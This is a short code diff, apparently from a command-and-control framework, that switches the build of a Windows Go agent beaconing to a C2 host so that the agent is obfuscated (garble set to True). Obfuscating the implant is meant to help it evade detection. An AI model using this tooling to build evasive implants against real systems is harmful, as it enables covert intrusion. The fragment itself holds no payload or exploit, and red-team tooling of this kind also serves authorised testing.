@@ -2033,7 +2033,7 @@ def {cmd_func}(cmd):
         agent_path = self.generate_go_agent(
             c2_host, c2_port, encryption_key=encryption_key or 'SOCKPUPPETS_KEY_2026',
             transport=transport, beacon_interval=beacon_interval,
-            target_os='windows', target_arch=target_arch, garble=False
+            target_os='windows', target_arch=target_arch, garble=True
         )
         if agent_path.startswith('Error'):
             return agent_path
